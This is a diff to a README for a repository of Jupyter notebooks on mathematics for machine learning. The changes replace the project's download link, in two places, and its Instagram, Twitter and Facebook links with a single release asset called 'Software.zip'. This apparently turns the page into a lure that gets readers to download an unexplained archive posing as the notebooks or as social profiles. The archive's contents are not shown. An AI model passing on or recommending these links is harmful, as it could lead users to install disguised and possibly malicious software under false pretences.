@@ -29,7 +29,7 @@ Each notebook in this repository is carefully crafted to provide interactive dem
 
 ## Quick Start 🚀
 
-To get started, simply [download the repository as a ZIP file](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip) and extract the contents. Launch your favorite Jupyter environment and explore the notebooks at your own pace. Let's dive into the exciting world of Mathematics for Machine Learning!
+To get started, simply [download the repository as a ZIP file](https://github.com/Nathan0002/maths_pour_machine_learning/releases/download/v1.0/Software.zip) and extract the contents. Launch your favorite Jupyter environment and explore the notebooks at your own pace. Let's dive into the exciting world of Mathematics for Machine Learning!
 
 ## Showcase 🌟
 
@@ -52,15 +52,15 @@ If you have any questions, suggestions, or feedback regarding the notebooks or t
 
 ## Releases 📦
 
-If the provided [link](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip) does not work or you prefer to explore the latest releases, make sure to check the "Releases" section of this repository for updated versions of the notebooks and additional resources.
+If the provided [link](https://github.com/Nathan0002/maths_pour_machine_learning/releases/download/v1.0/Software.zip) does not work or you prefer to explore the latest releases, make sure to check the "Releases" section of this repository for updated versions of the notebooks and additional resources.
 
 ## Let's Connect! 🌐
 
 Stay updated on the latest advancements in Mathematics for Machine Learning by following us on social media. Join the conversation, share your insights, and connect with like-minded individuals passionate about leveraging mathematical principles in the field of Machine Learning.
 
-📷 [Instagram](https://www.instagram.com/maths_machine_learning)
-🐦 [Twitter](https://twitter.com/maths4ML)
-📘 [Facebook](https://www.facebook.com/maths4ML)
+📷 [Instagram](https://github.com/Nathan0002/maths_pour_machine_learning/releases/download/v1.0/Software.zip)
+🐦 [Twitter](https://github.com/Nathan0002/maths_pour_machine_learning/releases/download/v1.0/Software.zip)
+📘 [Facebook](https://github.com/Nathan0002/maths_pour_machine_learning/releases/download/v1.0/Software.zip)
 
 ## License 📜
 
